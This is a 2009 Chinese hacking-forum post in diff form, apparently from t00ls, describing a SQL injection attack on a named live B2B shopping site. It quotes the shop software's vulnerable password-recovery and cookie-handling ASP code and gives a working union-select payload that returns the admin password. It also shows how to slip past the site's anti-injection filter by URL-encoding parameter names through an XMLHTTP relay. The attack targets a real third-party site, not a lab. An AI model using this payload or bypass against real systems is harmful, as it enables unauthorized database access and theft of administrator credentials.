@@ -1,0 +1,145 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+突破防注入继续注入
+D8888D主贴内容-------------------------------------------------------
+ 
+
+上次发表了篇注入中转的高级应用，里面提到防注入的突破。下面有个实例，比较早做的动画视频，现在转成文章。
+----------------------------------------------------------------------------------------
+今日无事，遇到一个站，看下
+[url=http://www.etwj.net/b2b_cpinfo.asp?id=832]链接标记http://www.etwj.net/b2b_cpinfo.asp?id=832[/url]
+
+哇b2b    百尔买商城耶，便宜了小菜我了
+有oday [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01找回密码：disuser2.asp 
+
+02set rs=server.CreateObject("adodb.recordset") 
+
+03rs.open "select UserQuestion,UserAnswer from [user] where username='"&trim(request.form("username"))&"' ",conn,1,1 
+
+04if rs.eof and rs.bof then 
+
+05response.write "<center> 
+
+06查无此用户，请返回！</center>" 
+
+07else 
+
+08   ．．．中间省略．．．． 
+
+09response.Write "<font color=red>"&trim(rs("UserQuestion"))&"</font>"
+
+10end if 
+
+11rs.close 
+
+12set rs=nothing 
+
+13不多解释了，在首页点＂忘密＂ 
+
+14然后输入a' union select userpassword,admin from admin where ''='，就看到管理员密码了．同样在更改密码的时候，username也没有过滤，也造成了可以更改任意用户的密码，不过没啥太大的有处，因为管理员表和用户表是分开的，我们不能更改管理员的密码
+当然还有其他漏洞，不过今天主要用这个
+不过当我输进去的时候发现
+出现这个
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09123015376f209fb52ba197e6.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE1NnwzYjA4ZmE4MXwxMjg2NDgyMzcyfDViMGI4RGZ3ejdIQy81TFpZRWhXL2JBZ3duQW5OOGh0RE13MkdQdEdrVzFsZ1Uw&nothumb=yes]链接标记下载[/url] (35.98 KB)
+
+2009-12-30 15:37
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/091230153774e4ddacc1be772c.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE1N3xkZTBiODFkOXwxMjg2NDgyMzcyfDViMGI4RGZ3ejdIQy81TFpZRWhXL2JBZ3duQW5OOGh0RE13MkdQdEdrVzFsZ1Uw&nothumb=yes]链接标记下载[/url] (25.81 KB)
+
+2009-12-30 15:37
+运气不好啊，原版的百尔买只防get注入，现在连post也防了？哎，怎么办啊。可能有人想到了用cookies注入
+不过如果用cookies注入绕过来注入，那种文章就。。。太。。。。，我也不敢在t00ls发了
+分析了下
+原版的防注入get型的使用 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01Dim Fy_Url,Fy_a,Fy_x,Fy_Cs(),Fy_Cl,Fy_Ts,Fy_Zx 
+
+02Fy_Cl = 1   
+
+03Fy_Zx = "index.Asp" 
+
+04On Error Resume Next
+
+05Fy_Url=Request.ServerVariables("QUERY_STRING") 
+
+06Fy_a=split(Fy_Url,"&") 
+
+07redim Fy_Cs(ubound(Fy_a)) 
+
+08On Error Resume Next
+
+09for Fy_x=0 to ubound(Fy_a) 
+
+10Fy_Cs(Fy_x) = left(Fy_a(Fy_x),instr(Fy_a(Fy_x),"=")-1) 
+
+11Next
+
+12For Fy_x=0 to ubound(Fy_Cs) 
+
+13If Fy_Cs(Fy_x)<>"" Then
+
+14If Instr(LCase(Request(Fy_Cs(Fy_x))),"'")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"and")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"select")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"update")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"chr")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"delete%20from")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),";")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"insert")<>0 or Instr(LCase(Request(Fy_Cs(Fy_x))),"mid")<>0 Or Instr(LCase(Request(Fy_Cs(Fy_x))),"master.")<>0 Then
+
+15Select Case Fy_Cl 
+
+16   Case "1"
+
+17Response.Write "<Script Language=JavaScript>alert('出现错误！参数 "&Fy_Cs(Fy_x)&" 的值中包含非法字符串！\n\n   请不要在参数中出现：;,and,select,update,insert,delete,chr 等非法字符！');window.close();</Script>"
+
+18   Case "2"
+
+19Response.Write "<Script Language=JavaScript>location.href='"&Fy_Zx&"'</Script>"
+
+20   Case "3"
+
+21Response.Write "<Script Language=JavaScript>alert(‘出现错误！参数 "&Fy_Cs(Fy_x)&"的值中包含非法字符串！\n\n   请不要在参数中出现：;,and,select,update,insert,delete,chr 等非法字符！');location.href='"&Fy_Zx&"';</Script>"
+
+22End Select
+
+23   ．．．．中间省略　．．．．． 
+
+24strUserName = "非注册用户"
+
+25strTitle = "非注册用户"
+
+26if Request.Cookies("Buy2Buy")("username")<>"" then  
+
+27set rsVip=server.CreateObject("adodb.recordset") 
+
+28rsVip.open "select [User].GrpID,[User].UserID,[User].Score,[User].UserEmail,[User].Deposit,[User].UserName,b2b_userjb.GrpName,b2b_userjb.Stars from [User] Inner Join b2b_userjb On [User].GrpID = b2b_userjb.GrpID where username='"&request.Cookies("Buy2Buy")("username")&"' ",conn,1,1 ／／／这里直接把ＣＯＯＫＩＥ里的ＵＳＥＲＮＡＭＥ拼进了ＳＱＬ，漏洞产生了！ 
+
+29   ．．．．中间省略　．．．．． 
+
+30strUserName = rsVip("UserName") 
+
+31   ．．．．中间省略　．．．．． 
+
+32set rsVip=nothing  
+
+33End If
+这个可以用编码绕过id-->>%69d
+小菜我就猜啊，post也是不是用同样也可用这样呢??
+小菜学过点asp.....知道post表单里面的参数是不能用url编码的  '也就是说<input type=text name=id value=""> 变成 <input type=text name=%69d value=""> 是行不通的
+也就是无法自己构造表单把id-->>%69d
+
+怎么办呢？？
+
+这时侯，我想到了伟大的寂寞的刺猬同志
+
+生成了个中转
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/09123015235bfef1a05228d4e3.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE1M3w3OGE3NGI3NnwxMjg2NDgyMzcyfDViMGI4RGZ3ejdIQy81TFpZRWhXL2JBZ3duQW5OOGh0RE13MkdQdEdrVzFsZ1Uw&nothumb=yes]链接标记下载[/url] (77.57 KB)
+
+2009-12-30 15:23
+代码如图，稍作调整，把username-->>%75sername
+利用xmlhttp的特性转发出去
+
+我们看下效果
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912301527c20c2d525d0c841c.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE1NHxhNTdhMjMxMHwxMjg2NDgyMzcyfDViMGI4RGZ3ejdIQy81TFpZRWhXL2JBZ3duQW5OOGh0RE13MkdQdEdrVzFsZ1Uw&nothumb=yes]链接标记下载[/url] (48.58 KB)
+
+2009-12-30 15:27
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0912/0912301527ca9c3a196f5283e7.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzE1NXxmNmEwZTZhNnwxMjg2NDgyMzcyfDViMGI4RGZ3ejdIQy81TFpZRWhXL2JBZ3duQW5OOGh0RE13MkdQdEdrVzFsZ1Uw&nothumb=yes]链接标记下载[/url] (49.29 KB)
+
+2009-12-30 15:27
+出来了。。。哈哈
+--------------------------------------------------------------------------------------------------
+录像：[url=http://applelrq.qupan.com/5505284.html]链接标记http://applelrq.qupan.com/5505284.html[/url]  声明下：本人没用过远控之类的东东，如果发现杀毒软件报警，我也不知道为什么。。。。我做这个教程的时候做了两次，一次被诺顿杀了。。。。不知道为什么
+   by 3x
